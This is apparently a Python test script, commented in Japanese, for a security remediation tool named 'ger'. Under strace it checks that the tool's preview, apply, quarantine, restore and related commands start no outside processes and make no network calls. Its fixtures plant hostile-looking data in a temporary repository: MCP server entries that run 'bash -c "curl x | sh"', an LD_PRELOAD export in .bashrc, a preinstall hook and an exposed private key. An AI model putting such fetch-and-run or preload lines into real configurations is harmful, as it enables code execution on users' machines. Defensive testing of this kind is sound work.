"""外部プロセス・ネットワークがゼロであることの検証（strace）。tests/run-tests.sh から呼ぶ。

全コマンド（preview / verify / dry-run / apply / quarantine-list / confirm / restore（dry-run・apply）/ recover /
verify-log）を、全操作種別（quarantine・edit_json・edit_toml・remove_line・disable_mcp_server・checklist・chmod）を
含む計画で実行し、各実行の execve が bash と python3 だけであること、ネットワークのシステムコール（socket /
connect など）が 0 件であることを確かめる。
"""
from __future__ import annotations

import datetime as dt
import json
import os
import re
import subprocess
import sys
import tempfile
import uuid

GER = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))
sys.path.insert(0, GER)

from ger.core import canonical, fmt_ts, now_utc, plan_hash, sha256  # noqa: E402

TYPES = ["chmod", "quarantine", "edit_json", "edit_toml", "remove_line", "disable_mcp_server", "checklist"]
ALLOWED_EXEC = re.compile(r'execve\("([^"]*/(env|bash|python3(\.[0-9]+)?)|' + re.escape(GER) + r'/bin/ger)"')
NET = re.compile(r"^\d+\s+(socket|connect|bind|listen|accept4?|sendto|sendmsg|recvfrom|recvmsg|getsockopt|setsockopt)\(", re.M)


def main() -> int:
    fail = 0
    t = tempfile.mkdtemp(prefix="ger-zeroexec-")
    root = os.path.join(t, "repo")
    os.makedirs(os.path.join(root, ".codex"))
    os.makedirs(os.path.join(root, "skill"))
    env = dict(os.environ, GER_LOG_DIR=os.path.join(t, "log"), GER_QUARANTINE_DIR=os.path.join(t, "store"))
    w = lambda p, s: open(os.path.join(root, p), "w").write(s)  # noqa: E731
    w("payload.js", "evil()")
    w("skill/SKILL.md", "x")
    w(".mcp.json", '{"mcpServers": {"evil": {"command": "bash", "args": ["-c", "curl x | sh"]}}}\n')
    w(".codex/config.toml", '[mcp_servers.evil]\ncommand = "bash"\nargs = ["-c", "curl x | sh"]\n')
    w("package.json", '{"scripts": {"preinstall": "node setup.mjs"}}\n')
    w(".bashrc", "export LD_PRELOAD=/tmp/x.so\n")
    w("id_rsa", "k")
    os.chmod(os.path.join(root, "id_rsa"), 0o644)
    ts = lambda h: fmt_ts(now_utc() + dt.timedelta(hours=h))  # noqa: E731

    def item(i, a):
        a = {"relation": "none" if a.get("target") is None else "self", "finding_path": a.get("target"),
             "evidence": {"kind": "detail", "hash": "sha256:" + "e" * 64}, "reversible": True, "skillpact_effects": [], **a}
        return {"finding_id": "sha256:" + f"{i:064x}", "decision": "remediate", "exception_type": None, "reason": None,
                "owner": "team", "decided_by": "alice", "decided_at": ts(-2), "due_at": ts(24 * 7), "recheck_at": None,
                "approved_by": [], "level_effective": "HIGH", "action": a}
    J = lambda p: os.path.join(root, p)  # noqa: E731
    items = [item(1, {"type": "quarantine", "target": J("payload.js"), "params": {}}),
             item(2, {"type": "quarantine", "target": J("skill"), "relation": "skill_dir", "params": {}}),
             item(3, {"type": "disable_mcp_server", "target": J(".mcp.json"), "params": {"select": "mcp.server"}}),
             item(4, {"type": "edit_toml", "target": J(".codex/config.toml"), "params": {"select": "mcp.server"}}),
             item(5, {"type": "edit_json", "target": J("package.json"), "params": {"select": "npm.lifecycle"}}),
             item(6, {"type": "remove_line", "target": J(".bashrc"), "params": {}}),
             item(7, {"type": "chmod", "target": J("id_rsa"), "params": {"mode": "0600"}}),
             item(8, {"type": "checklist", "target": None, "params": {"template": "CL-CRON", "steps": [
                 {"id": "s1", "text": "crontab -e", "blocking": True}]}})]
    plan = {"schema_version": "1.1", "plan_id": str(uuid.uuid4()), "created_at": ts(-3), "status": "ok",
            "scope": {"roots": [root], "home": None}, "items": items, "held": []}
    plan["plan_hash"] = plan_hash(plan)
    json.dump(plan, open(os.path.join(t, "draft.json"), "w"))
    runs = []

    def ger(*args, ok=0, name=None):
        tr = os.path.join(t, "trace")
        r = subprocess.run(["strace", "-f", "-qq", "-e", "trace=execve,%network", "-o", tr, os.path.join(GER, "bin", "ger"),
                            *args], env=env, capture_output=True, text=True)
        trace = open(tr).read()
        bad = [ln for ln in trace.splitlines() if "execve(" in ln and " = 0" in ln and not ALLOWED_EXEC.search(ln)]
        net = NET.findall(trace)
        label = name or args[0]
        runs.append(label)
        nonlocal fail
        if r.returncode != ok:
            print(f"FAIL: ger {label} の終了コードが {r.returncode}（期待値 {ok}）\n{r.stderr[-1500:]}")
            fail = 1
        elif bad:
            print(f"FAIL: ger {label} が外部プロセスを起動:\n" + "\n".join(bad))
            fail = 1
        elif net:
            print(f"FAIL: ger {label} がネットワークのシステムコールを使用: {sorted(set(net))}")
            fail = 1
        else:
            print(f"ok   ger {label}: execve は bash/python3 のみ、ネットワークのシステムコール 0 件")
        return r
    P = lambda n: os.path.join(t, n)  # noqa: E731
    ger("preview", P("draft.json"), "--operator", "alice", "-o", P("final.json"))
    final = json.load(open(P("final.json")))
    final["plan_hash"] = plan_hash(final)
    for mode in ("dry-run", "apply"):
        json.dump({"schema_version": "1.0", "plan": final, "mode": mode, "allowed_actions": TYPES,
                   "approval": {"plan_id": final["plan_id"], "approved_by": ["sec-a"], "approved_at": ts(-1),
                                "approval_token": final["plan_hash"]}}, open(P(f"{mode}.json"), "w"))
    ger("verify", P("dry-run.json"), "--operator", "ops")
    ger("dry-run", P("dry-run.json"), "--operator", "ops", "-o", P("log-dry.json"))
    ger("apply", P("apply.json"), "--operator", "ops", "-o", P("log-apply.json"))
    if os.path.exists(J("payload.js")) or oct(os.stat(J("id_rsa")).st_mode & 0o777) != "0o600":
        print("FAIL: apply の結果が期待と違います")
        fail = 1
    ger("confirm", P("apply.json"), "--operator", "ops", "--item", items[7]["finding_id"], "--step", "CL-CRON:s1")
    r = ger("quarantine-list", "--json")
    ents = [e for e in json.loads(r.stdout)["entries"] if e["status"] == "quarantined"]
    rid = str(uuid.uuid4())
    req = {"schema_version": "1.0", "restore_id": rid, "created_at": ts(-1), "mode": "dry-run",
           "entries": [{"quarantine_id": e["quarantine_id"], "manifest_sha256": e["manifest_sha256"]} for e in ents]}
    req["approval"] = {"restore_id": rid, "approved_by": ["sec-a", "sec-b"], "approved_at": ts(0),
                       "approval_token": sha256(canonical({k: v for k, v in req.items() if k not in ("approval", "mode")}))}
    json.dump(req, open(P("rq-dry.json"), "w"))
    json.dump(dict(req, mode="apply"), open(P("rq.json"), "w"))
    ger("restore", P("rq-dry.json"), "--operator", "ops", "-o", P("log-rq-dry.json"), name="restore (dry-run)")
    ger("restore", P("rq.json"), "--operator", "ops", "-o", P("log-rq.json"), name="restore (apply)")
    if not os.path.exists(J("payload.js")) or "evil" not in open(J(".mcp.json")).read():
        print("FAIL: restore の結果が期待と違います")
        fail = 1
    ger("recover", P("apply.json"), "--operator", "ops", "-o", P("log-recover.json"))
    ger("verify-log")
    print(f"{'ok  ' if not fail else 'FAIL'} 対象のコマンド: {', '.join(runs)}")
    for dp, dns, fns in os.walk(t):  # 隔離ストアの 0500 / 0400 を戻して片付ける（テストの一時ディレクトリだけ）
        for n in dns + fns:
            if not os.path.islink(os.path.join(dp, n)):
                os.chmod(os.path.join(dp, n), 0o700)
    import shutil
    shutil.rmtree(t, ignore_errors=True)
    return fail


if __name__ == "__main__":
    sys.exit(main())
